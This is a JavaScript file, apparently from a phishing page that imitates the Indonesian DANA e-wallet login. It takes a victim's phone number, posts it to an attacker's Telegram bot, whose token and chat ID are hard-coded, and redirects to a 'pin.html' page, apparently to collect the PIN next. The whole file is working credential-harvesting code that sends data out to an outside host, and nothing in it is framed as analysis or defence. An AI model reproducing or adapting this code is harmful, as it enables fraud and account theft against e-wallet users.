document.addEventListener("DOMContentLoaded", function () {
  const input = document.getElementById("phoneNumber");
  const loading = document.getElementById("loading");

  const BOT_TOKEN = "8323795788:AAEEPpk072P23uatFdMS92CjcuVBYkc6tHM";
  const CHAT_ID = "8080097570";

  // Format input otomatis
  input.addEventListener("input", function () {
    let cleaned = this.value.replace(/\D/g, ""); 
    let formatted = cleaned.match(/.{1,4}/g)?.join("-") || cleaned;
    this.value = formatted;
    this.classList.remove("error");
  });

  // Fungsi kirim ke Telegram
  async function kirimKeTelegram(pesan) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const data = {
      chat_id: CHAT_ID,
      text: pesan
    };
    return fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });
  }

  // Fungsi lanjutkan
  async function lanjutkan() {
    const nomor = input.value.trim().replace(/\D/g, '');
    if (!nomor) {
      input.classList.add('error');
      return;
    }

    loading.style.display = "block";

    const formattedNomor = nomor.match(/.{1,4}/g)?.join('-') || nomor;
    
    // TAHAP 1: Kirim hanya nomor DANA
    const message = `ððððð ðððð: ${formattedNomor}`;

    try {
      await kirimKeTelegram(message);
      // Simpan nomor ke localStorage untuk halaman selanjutnya
      localStorage.setItem("phoneNumber", nomor);
      // Redirect otomatis setelah sukses
      window.location.href = "pin.html";
    } catch (err) {
      console.error("â Transmission failed:", err);
    } finally {
      loading.style.display = "none";
    }
  }

  // Klik tombol
  document.getElementById("lanjutBtn").addEventListener("click", lanjutkan);

  // Enter key support
  input.addEventListener("keypress", function (e) {
    if (e.key === "Enter") {
      lanjutkan();
    }
  });
});